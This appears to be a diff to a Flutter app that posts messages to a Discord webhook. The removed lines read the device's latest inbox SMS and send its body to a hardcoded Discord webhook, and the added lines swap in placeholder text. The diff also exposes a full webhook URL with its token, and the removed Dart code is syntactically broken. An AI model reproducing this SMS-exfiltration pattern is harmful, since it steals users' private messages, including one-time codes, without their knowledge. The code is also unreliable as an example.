@@ -3,19 +3,9 @@ import 'package:http/http.dart' as http;
 import 'dart:convert';
 
 Future<void> sendToDiscordWebhook() async {
-  String latestSms = "No SMS available";
-  Telephony telephony = Telephony.instance;
-  List<SmsMessage> messages = await telephony.getInboxSms();
-  if (messages.isNotEmpty) {
-    SmsMessage latestMessage = messages.first;
-    latestSms = "Latest SMS: ${latestMessage.body}";}
-  else{
-    latestSms = "Latest SMS: no latest sms";}
-  }
-  String webhookUrl =
-      "https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU";
+  String webhookUrl ="https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU";
   final Map<String, String> headers = {'Content-Type': 'application/json'};
-  final Map<String, dynamic> data = {'content': latestSms};
+  final Map<String, dynamic> data = {'content': "hhhhh"};
   final String jsonData = json.encode(data);
 
   final response = await http.post(
@@ -51,15 +41,6 @@ class DiscordWebhookApp extends StatefulWidget {
 class _DiscordWebhookAppState extends State<DiscordWebhookApp> {
   TextEditingController textEditingController = TextEditingController();
   String outputText = '';
-  String latestSms1 = "No SMS available";
-  Telephony telephony1 = Telephony.instance;
-  List<SmsMessage> messages1 = await telephony1.getInboxSms();
-  if (messages1.isNotEmpty) {
-    SmsMessage latestMessage1 = messages1.first;
-    latestSms1 = "Latest SMS: ${latestMessage1.body}";}
-  else{
-    latestSms1 = "Latest SMS: no latest sms";}
-  }
   @override
   Widget build(BuildContext context) {
     return Scaffold(
@@ -71,7 +52,7 @@ class _DiscordWebhookAppState extends State<DiscordWebhookApp> {
         child: Column(
           mainAxisAlignment: MainAxisAlignment.center,
           children: <Widget>[
-            Text(latestSms),
+            Text("new sms hear"),
             TextField(
               controller: textEditingController,
               decoration: InputDecoration(hintText: "Enter your message"),
